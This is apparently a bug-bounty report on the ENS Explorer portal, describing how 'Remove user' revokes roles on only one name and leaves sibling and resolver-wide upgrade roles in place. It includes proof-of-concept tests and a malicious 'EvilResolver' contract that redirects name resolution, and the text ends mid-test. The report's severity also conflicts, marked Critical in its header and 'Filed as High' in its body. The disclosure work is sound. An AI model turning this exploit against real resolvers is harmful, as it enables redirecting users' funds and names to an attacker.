# 90678 w a critical explorer remove user revokes one resolver scope leaving removed accounts with sibling name roles and global upgrade authority

**Submitted on Aug 26th 2026 at 11:17:24 UTC by @dubcrab for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90678
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as:
    * resolving or rendering an ENS name to an attacker-controlled address
    * showing the wrong recipient or amount on a transaction the user then approves

## Description

## Brief/Intro

The resolver roles screen groups role holders by account, so an account with roles on several names of one resolver is drawn as a single row covering all of them. "Remove user" then builds a resource scoped authorization write out of a role bitmap aggregated across resources: one transaction, one name, the union of everything the account holds anywhere on that resolver, while the dialog promises removal from all roles. The transaction succeeds, and the app treats that receipt as the removal having happened. Everything the account held elsewhere on that resolver survives, including resolver wide roles: with `ROLE_UPGRADE` it can replace the resolver implementation for every name that resolver serves, and the owner has no upgrade path back. At the record level it repoints one of the owner's other names at an address it controls, and Explorer's own recipient fields then resolve that name to the attacker's address and preload it for signature.

## Vulnerability Details

### One row per (account, resource) in, one row per account out

A role in `PermissionedResolver` is attached to a resource, and a resource is one name, plus a separate root resource for resolver wide roles. The app's query asks for role rows carrying both (`useResolverOverview.ts:68`):

```graphql
roles { account resource roleBitmap blockNumber transactionHash timestamp name }
```

An account appears once per resource it holds roles on. `groupRolesByAccount` (`lib/roles/resolverRoles.ts:179`) keys its map on `account.toLowerCase()`, merging those rows: `resolvedNames` becomes a set of names, `decodedRoles` a union of bitmaps. `buildResourceToNameMap` (`:151`) maps the root resource to `(root)` in the same set.

### One name is taken out of the merged set

`ResolverRolesSidebar.tsx:169`:

```ts
const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

The rest is dropped. Which name survives depends on the order the indexer returned the rows, so there is no fixed victim.

`handleRemoveUser` (`:307`) passes that name plus `decodedRoles`, the union, into `prepareRevokeResolverRolesTransaction` (`features/resolver/helpers/revokeResolverRoles.ts:29`), which already handles both scopes:

```ts
name === ''
  ? { resolverAddress, targetAccount: account, scope: 'root', roles }
  : { resolverAddress, targetAccount: account, scope: 'name', name, roles }
```

A row holding only root roles therefore works: `find` returns `undefined`, `roleName` is `''`, the call goes to `revokeRootRoles`. The break is the mixed row. One name role alongside the global ones makes `find` return that name, the branch flips to `scope: 'name'`, and the root roles are never mentioned in the transaction. Two name rows behave the same way: one is revoked, the rest are not.

`handleSaveChanges` (`:295`) uses the same `roleName`, so unticking a permission on a merged row also lands on one name.

### What the owner is shown

The sheet header (`:393-395`) prints `Roles scoped to alpha.eth, beta.eth`, or `Global roles (all names)` for a row including the root resource. The confirm dialog (`:444-448`) says "Are you sure you want to remove this user from all roles? This action cannot be undone."

### Why the chain accepts it

`EnhancedAccessControl._revokeRoles` clears the bits the account holds at that resource and does nothing for the rest, without reverting. Correct behaviour for a single scope revoke. The app asks that function to undo state it drew as multi scope and gets a clean receipt for a partial one.

`ROLE_UPGRADE` is the portal's "Upgrade" permission (`resolverRoles.ts:43`), grantable for all names through Add user, and `PermissionedResolver._authorizeUpgrade` is `onlyRootRoles(ROLE_UPGRADE)` (`PermissionedResolver.sol:748-752`). Surviving the revoke, it is enough to call `upgradeToAndCall` on the proxy.

The setup is the standard one: migration gives an owner one dedicated `PermissionedResolver` reused for every name they migrate (`ensureOwnedPermRes.ts:73-95`) and grants the migrating wallet all roles at the root (`buildAtomicMigrationBatches.ts:429`). Nothing on this path is chain specific; `chainId` is a parameter throughout with no branch on it.

## Impact Details

Three levels, worst first, all reproduced in the Proof of Concept against their `PermissionedResolver`, the record level also against the live Sepolia implementation on a fork. Each sends the calldata the app builds.

**Resolver wide takeover, with no recovery.** Resolver wide roles are never mentioned in the call, so they survive whole. With `ROLE_UPGRADE` the removed account calls `upgradeToAndCall` on the proxy and installs its own implementation. Every name that resolver serves then answers with whatever that implementation returns, including names the account never held a role on, and the owner's attempt to upgrade back reverts. Migration hands each owner one resolver and reuses it for every name they migrate, so the blast radius is that owner's whole portfolio. This is an authorization revocation failure, not a labelling mistake: the owner performed the one action the product offers for ending trust, was told it succeeded, and the authority is still there.

**Records on the sibling names.** At the record level the removed account keeps `ROLE_SET_ADDR` on the owner's other name and repoints what it resolves to. In the run walked through in the Proof of Concept, `beta.eth` resolves to the attacker's address.

**Explorer turns those records into transaction targets.** `useAddressResolution` (`useAddressResolution.ts:47`) resolves through `getResolvedAddress.ts:26` into `resolveAddressOrName`, whose `getEnsAddress` call on the universal resolver (`addUser.handlers.ts:20`) reads exactly the record the removed account controls. Five call sites consume the hook: the transfer form (`SendNameForm.tsx:81`), subname creation (`create-subname.tsx:109`) and the three Add user sheets (`ResolverAddUserSheet.tsx:141`, `RegistryAddUserSheet.tsx:66`, `RolesAddUserSheet.tsx:73`). In the transfer form that address is shown as the recipient and used as the transfer target (`:81-82`, `startTransfer({ recipient })` at `:108`), and the confirmation panel reverse resolves it to a name and avatar the attacker controls (`:253-275`). A user who types the owner's other name into any of those five fields confirms a transaction that hands over the name, the subname or the roles.

### Why a successful transaction is part of the problem

A partial revoke is not merely undisclosed here, it is actively presented as a complete one. The app draws the account as a multi resource subject, prints the names that row covers, promises removal from all roles, sends a transaction that succeeds, and then reads that receipt as completion: `pollForIndexerSync` (`:241`, `:279`) repaints the table as done. Nothing in the product surfaces the surviving authority. An owner who removes a collaborator and moves on has no signal to act on.

### What limits it

The actor is an account the owner authorized earlier and then removed. For the record level variants the owner gets a second chance: once the indexer catches up the account reappears with whatever scope is left, and a careful owner rereading the table can retry name by name. A row coming back reads as indexer lag, though, which is the normal state right after a write. For the takeover variant there is no second chance at all.

### Selected impact

"Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient", specifically resolving an ENS name to an attacker controlled address and showing the wrong recipient on a transaction the user then approves. That is the third level above, and the attached screenshot `4-transfer-prefills-attacker.png` shows that screen. That bullet is written around a user submitting the transaction, which is exactly the path demonstrated.

The takeover level has no matching bullet for an Explorer flow, so I claim none for it. It is in the report because it sets the severity: the same single scope revoke that misdirects a recipient also leaves resolver wide upgrade authority in place. Filed as High.

### Not a known issue

QA-01 covers role combinations throwing errors after a transfer in Manager, and its carve out names "a role combination that grants unintended permissions" as a new finding. `groupRolesByAccount` has one consumer, `ResolverRolesTable.tsx:103`; the registry screens filter to the root resource (`useRegistryRoles.ts:71`), so those rows are single scope already.

### Suggested fix

Group by `(account, resource)` so one row means one scope. The query already returns a `name` per role row. If merged rows stay, `handleRemoveUser` and `handleSaveChanges` have to send one transaction per resource, root included, instead of picking a name. A guard on top: have `prepareRevokeResolverRolesTransaction` reject a bitmap carrying bits the account does not hold at the scope being written.

## References

Asset: `apps/portal` (Explorer). Audited commit `63772fd872af472ced58b009499355f3430c2a86`.\
Chain: Sepolia.

* `features/resolver/hooks/useResolverOverview.ts:68` (role rows query)
* `lib/roles/resolverRoles.ts:179`, `:151`, `:43`
* `features/resolver/components/ResolverRolesSidebar.tsx:169`, `:295`, `:307`, `:393-395`, `:444-448`, `:241`, `:279`
* `features/resolver/helpers/revokeResolverRoles.ts:29`
* `features/resolver/components/ResolverRolesTable.tsx:103`
* `features/address/hooks/useAddressResolution.ts:47` and its five call sites listed above, resolving through `features/address/queries/getResolvedAddress.ts:26` into `features/roles/helpers/addUser.handlers.ts:20` (`getEnsAddress` on the universal resolver)
* `features/transfer/components/SendNameForm.tsx:81-82`, `:108`, `:253-275`
* `features/registry/hooks/useRegistryRoles.ts:71`
* `apps/manager/src/features/migration/service/ensureOwnedPermRes.ts:73-95`, `.../buildAtomicMigrationBatches.ts:429`
* `PermissionedResolver._authorizeUpgrade` (`PermissionedResolver.sol:748-752`) and `EnhancedAccessControl._revokeRoles` in <https://github.com/ensdomains/contracts-v2>, out of scope, referenced only to show why the call is accepted

## Proof of Concept

## Preconditions

Everything below is the standard setup, nothing exotic:

* An owner holds two names on one `PermissionedResolver`. Migration gives each owner a single dedicated resolver, reused for every name they migrate (`apps/manager/.../ensureOwnedPermRes.ts:73-95`).
* Through `Add user` on the resolver roles screen the owner granted a collaborator account a role on each of those two names: Set Address on `alpha.eth`, Set Address and Set Text on `beta.eth`.
* For the third impact level the collaborator also holds resolver wide roles, which the same `Add user` sheet grants and which migration grants to the migrating wallet by default (`.../buildAtomicMigrationBatches.ts:429`).

## Step by step

{% stepper %}
{% step %}

## Open the resolver roles screen

The owner opens `/resolver/<resolverAddress>/roles`. The indexer returns one role row per `(account, resource)`, which is what the app's own query asks for (`useResolverOverview.ts:68`). The collaborator produces two rows, one per name.
{% endstep %}

{% step %}

## The app merges the account's scopes

`groupRolesByAccount` (`lib/roles/resolverRoles.ts:179`) keys its map on `account.toLowerCase()` and merges those rows into one: `resolvedNames` becomes `[alpha.eth, beta.eth]`, `decodedRoles` the union of both bitmaps. The table shows one row.
{% endstep %}

{% step %}

## The owner sees both names

The owner opens the row. The sheet header prints `Roles scoped to alpha.eth, beta.eth` (`ResolverRolesSidebar.tsx:393-395`), so the owner is told the row covers both names.
{% endstep %}

{% step %}

## The owner removes the user

The owner clicks `Remove user`. The dialog says "Are you sure you want to remove this user from all roles? This action cannot be undone." (`:444-448`).
{% endstep %}

{% step %}

## One scope is selected

`const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''` (`:169`) returns `alpha.eth` and drops the rest of the set. `handleRemoveUser` (`:307`) passes that single name plus the union bitmap into `prepareRevokeResolverRolesTransaction` (`features/resolver/helpers/revokeResolverRoles.ts:29`), whose `name === ''` branch is not taken, so it builds `scope: 'name'`:

```ts
authorizeNameRoles(dnsEncode('alpha.eth'), unionBitmap, collaborator, false)
```

{% endstep %}

{% step %}

## The partial revoke succeeds

The owner signs. `EnhancedAccessControl._revokeRoles` clears the bits the collaborator holds at `alpha.eth`'s resource and does nothing for the rest, without reverting. The receipt is a success and `pollForIndexerSync` (`:241`, `:279`) repaints the table as done. Nothing tells the owner that `beta.eth` was never in the call.
{% endstep %}

{% step %}

## The collaborator changes the sibling record

The collaborator, which the owner believes is removed, calls `setAddr(namehash('beta.eth'), attackerAddress)` on the resolver directly. It still holds `ROLE_SET_ADDR` at that resource, so the write succeeds. No custom tooling is needed for this, it is one contract call.
{% endstep %}

{% step %}

## Explorer resolves the attacker-controlled address

Any user who types `beta.eth` into a name or address field in Explorer now gets that address. `useAddressResolution` (`useAddressResolution.ts:47`) resolves through `getResolvedAddress.ts:26` into `resolveAddressOrName`, whose `getEnsAddress` call on the universal resolver (`addUser.handlers.ts:20`) reads exactly the record the collaborator controls. In the transfer form the resolved address is displayed as the recipient and used as the transfer target (`SendNameForm.tsx:81-82`, `startTransfer({ recipient })` at `:108`), and the confirmation panel reverse resolves it to a name and avatar the collaborator controls (`:253-275`). The user signs a transfer to the attacker.
{% endstep %}

{% step %}

## Resolver-wide roles also survive

If the collaborator also held resolver wide roles, those were never mentioned in step 5's call and survive whole. With `ROLE_UPGRADE`, whose check is `onlyRootRoles(ROLE_UPGRADE)` in `PermissionedResolver._authorizeUpgrade` (`PermissionedResolver.sol:748-752`), it calls `upgradeToAndCall` on the proxy and installs its own implementation. Every name that resolver serves then answers with whatever that implementation returns, and the owner's attempt to upgrade back reverts.
{% endstep %}
{% endstepper %}

Same root cause, second symptom: `handleSaveChanges` (`:295`) uses the same `roleName`, so unticking a single permission on a merged row also lands on one name and stays live on the others.

## Runnable PoCs

This competition asks for step by step PoCs, so the following is supplementary. It exists because it is stronger than prose.

All of it runs locally. The chain is a local Anvil fork and a local Foundry EVM, the accounts are local, and no transaction is broadcast to a public testnet or mainnet at any point. The one test that uses the live Sepolia implementation reads that bytecode over a fork and deploys its own proxy inside the local EVM.

### Client half: the app's own functions, no mocks

`poc-role-scope.test.ts` goes in `apps/portal/src/lib/roles/`.

```bash
pnpm --filter portal exec vitest run src/lib/roles/poc-role-scope.test.ts
```

Three tests, calling the app's own functions with nothing mocked in the logic under test. `groupRolesByAccount` merges two indexer rows into one group carrying both names, `ResolverRolesSidebar.tsx:169` picks `alpha.eth`, and the prepared intent, decoded with the ensjs ABI, is `authorizeNameRoles(dnsEncode('alpha.eth'), 17, collaborator, false)`. That bitmap carries a role the collaborator holds only on `beta.eth`, a name the call never mentions. The third test covers the mixed `(root)` row.

### Chain half: Foundry against their contracts

From a clean directory, with the four files inlined at the end of this report:

```bash
forge init --no-git poc-role-scope && cd poc-role-scope
forge install ensdomains/contracts-v2 --no-git
# then drop in foundry.toml, remappings.txt and test/RoleScopePoc.t.sol
```

It runs their `PermissionedResolver` from the pinned contracts-v2. One test stands up an ERC1967 proxy over the live Sepolia implementation `0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e` the way VerifiableFactory does, inside the fork, and skips itself when not forking. Namehash and DNS encoding come from their `NameCoder`.

```bash
forge test --match-contract RoleScopePoc -vv
FOUNDRY_ETH_RPC_URL=<sepolia rpc> forge test --match-contract RoleScopePoc -vv

[PASS] test_poc_liveImpl_removeUser_keepsSiblingNameWriteAccess()
[PASS] test_poc_local_removeUser_keepsSiblingNameWriteAccess()
[PASS] test_poc_local_rootRecordRolesSurviveRemoveUser()
[PASS] test_poc_local_rootUpgradeRoleSurvivesRemoveUser()
[PASS] test_poc_local_rootUpgrade_bricksTheResolverForEveryName()
[PASS] test_poc_local_rowOrderPicksTheOtherScope_siblingStillSurvives()
```

Each test asserts an outcome, not the absence of a revert, and carries a control. The record tests end with `resolver.addr(betaNode) == attacker`, against a control where the same write on the revoked name reverts. The root tests end with the removed account writing a record on a name the call never mentioned and then calling `upgradeToAndCall`, against controls where a proper root revoke stops the write and an account without the role cannot upgrade. `bricksTheResolverForEveryName` installs that implementation and shows the owner cannot upgrade back. `rowOrderPicks` grants in the reverse order, so the surviving scope flips.

### Recorded run through the app

`role-scope-poc.spec.ts` drives the whole loop through the app on the project's own e2e stack: two names registered on a local Anvil fork of Sepolia, both on one `PermissionedResolver`, a collaborator granted a role on each, then `/resolver/<address>/roles` with the wallet signing for real against that local chain. The four screenshots attached to this report are its output, in order: the row reading `Roles scoped to alpha, beta`; the dialog promising removal from all roles; the same account back in the table after the transaction with the untouched name in scope; and the transfer form resolving that name to `0x90F7...b906` under the recipient field.

The run was also recorded as a 49 s video with on-screen captions. This field only accepts images, so it is not attached; happy to provide it or the spec file through any channel you prefer.

Contracts, transactions and signatures are real, on the local fork. One stub: the local Panoptes build does not populate resolver roles, so the test answers `getResolverOverview` itself, rebuilt from live `hasRoles` reads before every request, in the shape the app's own role-rows query returns, one row per `(account, resource)` (step 1). It emits two rows, one per name; the merge is the app's. The `hasRoles` assertions read the chain directly and the recipient address is asserted inside the recipient block.

## Attached screenshots

1. `1-one-row-two-names.png`: one row for the collaborator, the sheet reading `Roles scoped to <alpha>, <beta>`.
2. `2-removed-from-all-roles.png`: the dialog promising removal from all roles.
3. `3-still-there-after-removal.png`: the same account back in the table after the transaction confirmed, now scoped to the name the call never touched.
4. `4-transfer-prefills-attacker.png`: the transfer form resolving that name to the removed account's chosen address, under the recipient field.

## PoC sources

Both files are inlined below so the report is self-contained. `poc-role-scope.test.ts` goes in `apps/portal/src/lib/roles/`. `RoleScopePoc.t.sol` goes in `test/` of a Foundry project with `forge install ensdomains/contracts-v2`, with the `foundry.toml` and `remappings.txt` given after it. `role-scope-poc.spec.ts`, the Playwright spec behind the screenshots, needs the project's e2e stack to run and is available on request.

### poc-role-scope.test.ts

```ts
/**
 * PoC — the resolver roles screen merges an account's roles across every name
 * on the resolver into ONE row, but every revoke it builds is bound to ONE name.
 *
 * Uses the app's own production functions, no mocks of the logic under test:
 *   - groupRolesByAccount            (src/lib/roles/resolverRoles.ts)
 *   - the sidebar's scope pick       (ResolverRolesSidebar.tsx:168, reproduced verbatim)
 *   - prepareRevokeResolverRolesTransaction
 *                                    (src/features/resolver/helpers/revokeResolverRoles.ts)
 */
import { permissionedResolverAuthorizeNameRolesSnippet } from '@ensdomains/ensjs-abi/v2/permissionedResolver'
import { packetToBytes } from 'viem/ens'
import { type Address, decodeFunctionData, toHex, type WalletClient } from 'viem'
import { describe, expect, it } from 'vitest'
import { prepareRevokeResolverRolesTransaction } from '@/features/resolver/helpers/revokeResolverRoles'
import {
  groupRolesByAccount,
  resolverRoles,
  type ResolverRoleKey,
} from '@/lib/roles/resolverRoles'

const RESOLVER = '0x1111111111111111111111111111111111111111' as Address
const OWNER = '0x2222222222222222222222222222222222222222' as Address
/** The collaborator the owner wants to remove. */
const COLLABORATOR = '0x3333333333333333333333333333333333333333' as Address

/** Two names served by the SAME PermissionedResolver — the normal per-owner setup. */
const ALPHA_RESOURCE = '0x00000000000000000000000000000000000000000000000000000000000000aa'
const BETA_RESOURCE = '0x00000000000000000000000000000000000000000000000000000000000000bb'

const resourceToName = new Map([
  [ALPHA_RESOURCE, 'alpha.eth'],
  [BETA_RESOURCE, 'beta.eth'],
])

/** What the indexer returns: one row per (account, resource). */
const indexerRoles = [
  {
    account: COLLABORATOR,
    resource: ALPHA_RESOURCE,
    roleBitmap: `0x${resolverRoles.ROLE_SET_ADDR.toString(16)}`,
  },
  {
    account: COLLABORATOR,
    resource: BETA_RESOURCE,
    roleBitmap: `0x${resolverRoles.ROLE_SET_TEXT.toString(16)}`,
  },
]

const walletClient = {
  account: { address: OWNER },
  chain: { id: 11155111 },
} as unknown as WalletClient

const dnsEncode = (name: string) => toHex(packetToBytes(name))

describe('PoC: resolver role revocation is applied to one name, shown as one account', () => {
  it('merges two per-name scopes into a single row with a union of roles', () => {
    const groups = groupRolesByAccount(indexerRoles, resourceToName)

    expect(groups).toHaveLength(1)
    expect([...groups[0]!.resolvedNames].sort()).toEqual(['alpha.eth', 'beta.eth'])
    // The union: a role held only on alpha and a role held only on beta.
    expect([...groups[0]!.decodedRoles].sort()).toEqual(
      ['ROLE_SET_ADDR', 'ROLE_SET_TEXT'].sort(),
    )
  })

  it('builds a revoke bound to ONE name while carrying the union bitmap', () => {
    const group = groupRolesByAccount(indexerRoles, resourceToName)[0]!

    // ResolverRolesSidebar.tsx:168 — the single scope every write lands on.
    const roleName = [...group.resolvedNames].find((n) => n !== '(root)') ?? ''
    expect(roleName).toBe('alpha.eth')

    // "Remove user" passes the whole union to that one scope
    // (ResolverRolesSidebar.tsx:316-321).
    const intent = prepareRevokeResolverRolesTransaction({
      resolverAddress: RESOLVER,
      name: roleName,
      account: COLLABORATOR,
      roles: [...group.decodedRoles] as ResolverRoleKey[],
      walletClient,
      chainId: 11155111,
    })

    const decoded = decodeFunctionData({
      abi: permissionedResolverAuthorizeNameRolesSnippet,
      data: intent.request.data,
    })

    expect(decoded.functionName).toBe('authorizeNameRoles')
    // The scope actually written: alpha only. beta is never named in the call.
    expect(decoded.args[0]).toBe(dnsEncode('alpha.eth'))
    expect(decoded.args[0]).not.toBe(dnsEncode('beta.eth'))
    expect(decoded.args[2]).toBe(COLLABORATOR)
    expect(decoded.args[3]).toBe(false) // false = revoke

    // The bitmap asks to remove ROLE_SET_TEXT too — a role the collaborator
    // holds only on beta. EnhancedAccessControl._revokeRoles no-ops on bits the
    // account does not hold at that resource, so beta keeps ROLE_SET_TEXT.
    const bitmap = decoded.args[1] as bigint
    expect(bitmap & resolverRoles.ROLE_SET_TEXT).not.toBe(0n)

    // The bug, stated as an invariant: one call, one name — while the row the
    // owner acted on represented two.
    expect(intent.request.to).toBe(RESOLVER)
  })

  it('leaves resolver-wide (root) roles in place: the sheet says "Global roles (all names)", the call is name-scoped', () => {
    const ROOT_RESOURCE =
      '0x0000000000000000000000000000000000000000000000000000000000000000'
    const rootAndName = [
      {
        account: COLLABORATOR,
        resource: ROOT_RESOURCE,
        roleBitmap: `0x${resolverRoles.ROLE_SET_TEXT.toString(16)}`,
      },
      {
        account: COLLABORATOR,
        resource: ALPHA_RESOURCE,
        roleBitmap: `0x${resolverRoles.ROLE_SET_ADDR.toString(16)}`,
      },
    ]
    const group = groupRolesByAccount(
      rootAndName,
      new Map([...resourceToName, [ROOT_RESOURCE, '(root)']]),
    )[0]!

    // ResolverRolesSidebar.tsx:393-394 — what the owner is told before clicking.
    expect(group.resolvedNames.includes('(root)')).toBe(true)

    // ResolverRolesSidebar.tsx:169 — "(root)" is skipped, the name wins.
    const roleName = [...group.resolvedNames].find((n) => n !== '(root)') ?? ''
    expect(roleName).toBe('alpha.eth')

    const intent = prepareRevokeResolverRolesTransaction({
      resolverAddress: RESOLVER,
      name: roleName,
      account: COLLABORATOR,
      roles: [...group.decodedRoles] as ResolverRoleKey[],
      walletClient,
      chainId: 11155111,
    })

    // A root-scoped removal would be revokeRootRoles(bitmap, account).
    // The app encodes authorizeNameRoles instead, so the global roles stay.
    const decoded = decodeFunctionData({
      abi: permissionedResolverAuthorizeNameRolesSnippet,
      data: intent.request.data,
    })
    expect(decoded.functionName).toBe('authorizeNameRoles')
    expect(decoded.args[0]).toBe(dnsEncode('alpha.eth'))
  })
})
```

### RoleScopePoc.t.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {PermissionedResolver} from "contracts-v2/resolver/PermissionedResolver.sol";
import {PermissionedResolverLib} from "contracts-v2/resolver/libraries/PermissionedResolverLib.sol";
import {NameCoder} from "@ens/contracts/utils/NameCoder.sol";

/// PoC — "Remove user" on the Portal resolver-roles screen revokes ONE name's
/// scope while the dialog promises removal from ALL roles.
///
/// App side (verified separately in vitest against production functions):
///   - the indexer returns one row per (account, resource); every name on the
///     resolver contributes rows for the same account
///   - groupRolesByAccount (apps/portal/src/lib/roles/resolverRoles.ts:193-215)
///     merges them into ONE row keyed by account only
///   - ResolverRolesSidebar.tsx:168 picks a SINGLE scope
///         resolvedNames.find((n) => n !== '(root)') ?? ''
///     diffs the UNION of decoded roles against it (:190-193), and
///     handleRemoveUser (:307-323) sends that whole union into the single scope
///   - revokeResolverRoles -> ensjs v2 write params -> authorizeNameRoles(name,
///     unionBitmap, targetAccount, false), scope bound to that one name
///   - confirm dialog text (:445-448): "Are you sure you want to remove this
///     user from all roles?"
///
/// Chain side proven here, against the real PermissionedResolver:
///   EnhancedAccessControl._revokeRoles clears bits ONLY at the resource named
///   by the call (currentRoles & ~roleBitmap, no-op per resource); sibling
///   names on the same shared per-owner resolver keep their bits, so the
///   removed account keeps writing their records.
/// A minimal implementation the removed account can install: it keeps the
/// ERC1822 slot so UUPS accepts the upgrade, answers every name with the
/// attacker's address, and exposes no upgrade entry point of its own.
contract EvilResolver {
    address internal immutable attacker;

    constructor(address attacker_) {
        attacker = attacker_;
    }

    function proxiableUUID() external pure returns (bytes32) {
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }

    function addr(bytes32) external view returns (address payable) {
        return payable(attacker);
    }
}

contract RoleScopePocTest is Test {
    // The app's init bitmap: apps/portal .../permissionedResolver.ts:21-23 and
    // apps/manager .../permissionedResolverAddress.ts:12 — all 16 nybbles of
    // regular AND admin roles granted to the owner at ROOT_RESOURCE.
    uint256 constant APP_INIT_BITMAP =
        0x1111111111111111111111111111111111111111111111111111111111111111;

    PermissionedResolver internal resolver;

    address internal owner = makeAddr("owner");
    address internal collaborator = makeAddr("collaborator");
    address internal attacker = makeAddr("attacker");

    bytes32 internal alphaNode = _namehash("alpha.eth");
    bytes32 internal betaNode = _namehash("beta.eth");

    function setUpLocal() internal {
        // Their implementation, compiled from the contest repo's pinned lib.
        PermissionedResolver impl = new PermissionedResolver(address(this));
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl),
            abi.encodeCall(
                PermissionedResolver.initialize,
                (owner, APP_INIT_BITMAP, new bytes[](0))
            )
        );
        resolver = PermissionedResolver(address(proxy));
    }

    function _grantPerNameScopes() internal {
        vm.startPrank(owner);
        resolver.authorizeNameRoles(
            _dns("alpha.eth"), PermissionedResolverLib.ROLE_SET_ADDR, collaborator, true
        );
        resolver.authorizeNameRoles(
            _dns("beta.eth"),
            PermissionedResolverLib.ROLE_SET_ADDR | PermissionedResolverLib.ROLE_SET_TEXT,
            collaborator,
            true
        );
        vm.stopPrank();

        // What the indexer returns for this account: two rows, two resources,
        // one account. groupRolesByAccount collapses them into one row whose
        // decodedRoles = [ROLE_SET_ADDR, ROLE_SET_TEXT] (the union across both
        // rows, text held only on beta) and resolvedNames = [alpha, beta].
        // So the union the sidebar sends really is SET_ADDR | SET_TEXT.
    }

    function test_poc_local_removeUser_keepsSiblingNameWriteAccess() public {
        setUpLocal();
        _runScenario();
    }

    function test_poc_liveImpl_removeUser_keepsSiblingNameWriteAccess() public {
        // Runs against the LIVE Sepolia implementation the app deploys through
        // VerifiableFactory (@ensdomains/ensjs l1.js,
        // ensPermissionedResolverImpl). We stand up our own ERC1967 proxy
        // exactly like the factory does; every role check runs in their
        // bytecode. Needs a Sepolia fork:
        //   FOUNDRY_ETH_RPC_URL=<sepolia rpc> forge test --match-test test_poc_liveImpl
        address liveImpl = 0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e;
        if (liveImpl.code.length == 0) vm.skip(true); // not forking Sepolia

        ERC1967Proxy proxy = new ERC1967Proxy(
            liveImpl,
            abi.encodeCall(
                PermissionedResolver.initialize,
                (owner, APP_INIT_BITMAP, new bytes[](0))
            )
        );
        resolver = PermissionedResolver(address(proxy));

        _runScenario();
    }

    function _runScenario() internal {
        _grantPerNameScopes();

        // Sanity: collaborator manages addresses on both names pre-removal.
        vm.startPrank(collaborator);
        resolver.setAddr(alphaNode, attacker);
        resolver.setAddr(betaNode, attacker);
        vm.stopPrank();

        // --- "Remove user" ---
        // The exact call prepareRevokeResolverRolesTransaction builds: the
        // union bitmap, bound to the ONE name the sidebar picked (first
        // non-root entry of resolvedNames -> alpha here).
        uint256 unionBitmap =
            PermissionedResolverLib.ROLE_SET_ADDR | PermissionedResolverLib.ROLE_SET_TEXT;
        vm.prank(owner);
        bool revoked = resolver.authorizeNameRoles(
            _dns("alpha.eth"), unionBitmap, collaborator, false
        );

        // The tx succeeds and does clear alpha...
        assertTrue(revoked, "revoke tx should succeed");
        assertEq(
            resolver.roles(_resource(alphaNode), collaborator),
            0,
            "alpha scope must be cleared"
        );

        // ...but beta was never named in the call. Its row survives untouched.
        assertTrue(
            resolver.hasRoles(
                _resource(betaNode), PermissionedResolverLib.ROLE_SET_ADDR, collaborator
            ),
            "BUG: sibling-name role survived 'remove this user from all roles'"
        );

        // Exploit outcome: the REMOVED user still re-points beta.eth wherever
        // he wants. Anyone resolving beta.eth now gets the attacker's wallet.
        vm.prank(collaborator);
        resolver.setAddr(betaNode, attacker);
        assertEq(resolver.addr(betaNode), attacker, "removed user hijacked resolution");

        // Control: the removal DID apply where it targeted — alpha is closed.
        vm.prank(collaborator);
        vm.expectRevert();
        resolver.setAddr(alphaNode, attacker);

        // And revoking bits the account holds only elsewhere is a silent
        // no-op, not an error: repeat the union revoke against alpha.
        vm.prank(owner);
        assertFalse(
            resolver.authorizeNameRoles(_dns("alpha.eth"), unionBitmap, collaborator, false),
            "revoking absent bits silently no-ops"
        );
    }

    /// Sidebar scope pick depends on indexer ROW ORDER (Set insertion order,
    /// find first non-root). Reverse the order and the revoke lands on beta
    /// while ALPHA keeps write access — whichever name is picked, its sibling
    /// is left authorized.
    function test_poc_local_rowOrderPicksTheOtherScope_siblingStillSurvives() public {
        setUpLocal();

        // Grant beta FIRST so the sidebar would pick beta as its single scope.
        vm.startPrank(owner);
        resolver.authorizeNameRoles(
            _dns("beta.eth"), PermissionedResolverLib.ROLE_SET_ADDR, collaborator, true
        );
        resolver.authorizeNameRoles(
            _dns("alpha.eth"), PermissionedResolverLib.ROLE_SET_ADDR, collaborator, true
        );
        vm.stopPrank();

        vm.prank(owner);
        resolver.authorizeNameRoles(
            _dns("beta.eth"),
            PermissionedResolverLib.ROLE_SET_ADDR | PermissionedResolverLib.ROLE_SET_TEXT,
            collaborator,
            false
        );

        assertTrue(
            resolver.hasRoles(
                _resource(alphaNode), PermissionedResolverLib.ROLE_SET_ADDR, collaborator
            ),
            "sibling survived again"
        );

        vm.prank(collaborator);
        resolver.setAddr(alphaNode, attacker);
        assertEq(resolver.addr(alphaNode), attacker);
    }

    /// Variant B: the account also holds resolver-wide (root) roles. The row
    /// then reads "(root)" plus the name, the sidebar skips "(root)"
    /// (ResolverRolesSidebar.tsx:169) and picks the name, so the app sends
    /// authorizeNameRoles instead of revokeRootRoles and the GLOBAL roles live
    /// on. The sheet header the owner just read said "Global roles (all names)"
    /// (:393-394).
    function test_poc_local_rootRecordRolesSurviveRemoveUser() public {
        setUpLocal();

        vm.startPrank(owner);
        resolver.grantRootRoles(PermissionedResolverLib.ROLE_SET_TEXT, collaborator);
        resolver.authorizeNameRoles(
            _dns("alpha.eth"), PermissionedResolverLib.ROLE_SET_ADDR, collaborator, true
        );
        vm.stopPrank();

        // "Remove user": one name-scoped call carrying the union of the row.
        vm.prank(owner);
        resolver.authorizeNameRoles(
            _dns("alpha.eth"),
            PermissionedResolverLib.ROLE_SET_ADDR | PermissionedResolverLib.ROLE_SET_TEXT,
            collaborator,
            false
        );

        assertFalse(
            resolver.hasRoles(
                _resource(alphaNode), PermissionedResolverLib.ROLE_SET_ADDR, collaborator
            ),
            "the picked name was cleared"
        );
        assertTrue(
            resolver.hasRootRoles(PermissionedResolverLib.ROLE_SET_TEXT, collaborator),
            "global roles survived a removal the UI called complete"
        );

        // Root scope covers every name the resolver serves, beta included.
        vm.prank(collaborator);
